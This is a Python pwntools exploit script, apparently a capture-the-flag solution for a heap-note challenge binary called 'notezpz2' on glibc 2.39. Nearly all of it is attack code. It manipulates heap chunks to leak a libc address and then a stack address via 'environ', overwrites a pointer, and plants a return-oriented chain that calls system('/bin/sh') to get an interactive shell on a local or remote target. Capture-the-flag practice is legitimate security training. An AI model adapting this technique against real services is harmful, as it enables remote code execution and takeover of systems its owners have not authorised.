#!/usr/bin/env python3

'''
    author: GeekCmore
    time: 2025-11-10 16:45:50
'''
from pwn import *
import os

filename = "notezpz2_patched"
libcname = "./libc6_2.39-0ubuntu8.6_amd64.so"
host = os.getenv("HOST", "127.0.0.1")
port = int(os.getenv("PORT", "8005"))
container_id = ""
proc_name = ""
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b main
set debug-file-directory /home/cks/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
set directories /home/cks/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    elif args.DOCKER:
        import docker
        from os import path
        p = remote(ip, port)
        client = docker.from_env()
        container = client.containers.get(container_id=container_id)
        processes_info = container.top()
        titles = processes_info['Titles']
        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
        target_proc = []
        for proc in processes:
            cmd = proc.get('CMD', '')
            exe_path = cmd.split()[0] if cmd else ''
            exe_name = path.basename(exe_path)
            if exe_name == proc_name:
                target_proc.append(proc)
        idx = 0
        if len(target_proc) > 1:
            for i, v in enumerate(target_proc):
                print(f"{i} => {v}")
            idx = int(input(f"Which one:"))
        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID']])
        return p
    else:
        return process(elf.path)

p = start()

p.sendline(str('c')) #0 0
sleep(0.1)
p.sendline(str('c')) #1 1
sleep(0.1)
p.sendline(str('c')) #2 2
sleep(0.1)
p.sendline(str('c')) #3 3
sleep(0.1)

p.sendline(str('d'))
sleep(0.1)
p.sendline(str('0'))
sleep(0.1)

p.sendline(str('d'))
sleep(0.1)
p.sendline(str('2'))
sleep(0.1)

p.sendline(str('c')) #4 2
sleep(0.1)

#chunk_0_into_largebin ==>chunk_4_have_libc

p.sendline(str('a')) #4
sleep(0.1)
p.sendline(str('4'))
sleep(0.1)
p.recvuntil('perhaps: \'')
libc_addr=u64(p.recvn(6).ljust(8,b'\x00'))-0x21ace0+94656
log.success(hex(libc_addr))
#================================
#clear bins
p.sendline(str('c')) #5 0
sleep(0.1)
p.sendline(str('c')) #6 4
sleep(0.1)
p.sendline(str('c')) #7 5
sleep(0.1)
p.sendline(str('c')) #8 6
sleep(0.1)
#0 1 2 3 6 7 8
#================================
p.sendline(str('d'))
sleep(0.1)
p.sendline(str('3'))
sleep(0.1)
p.sendline(str('d'))
sleep(0.1)
p.sendline(str('7'))
sleep(0.1)
p.sendline(str('c'))
sleep(0.1)
#================================
p.sendline(str('d'))
sleep(0.1)
p.sendline(str('0'))
sleep(0.1)
p.sendline(str('d'))
sleep(0.1)
p.sendline(str('1'))
sleep(0.1)
p.sendline(str('d'))
sleep(0.1)
p.sendline(str('7'))
sleep(0.1)
p.sendline(str('c'))
sleep(0.1)
#================================
p.sendline(str('s'))
sleep(0.1)
p.sendline(str('0'))
sleep(0.1)
payload=b'a'*0x28+p64(libc_addr+libc.sym['environ'])
p.sendline(payload)
sleep(0.1)
p.sendline(str('a'))
sleep(0.1)
p.sendline(str('0'))
sleep(0.1)
#================================
p.recvuntil('perhaps: \'')
stack_leak = u64(p.recvn(6).ljust(8,b'\x00'))
default_stack_off = '0x180' if args.REMOTE or args.DOCKER else '0x160'
stack_addr = stack_leak - int(os.getenv('STACK_OFF', default_stack_off), 0)
log.success(hex(stack_addr))
#================================
p.sendline(str('s'))
sleep(0.1)
p.sendline(str('3'))
sleep(0.1)
payload=b'a'*0x28+p64(stack_addr)
p.sendline(payload)
#================================
ret=libc_addr+0x2882f
pop_rdi_ret=libc_addr+0x10f78b
#================================
#gdb.attach(p)
#pause()
p.sendline(str('s'))
sleep(0.1)
p.sendline(str('3'))
sleep(0.1)
payload=p64(ret)+p64(pop_rdi_ret)+p64(libc_addr+next(libc.search('/bin/sh\x00')))+p64(libc_addr+libc.sym['system'])
p.sendline(payload)
#================================




p.interactive()
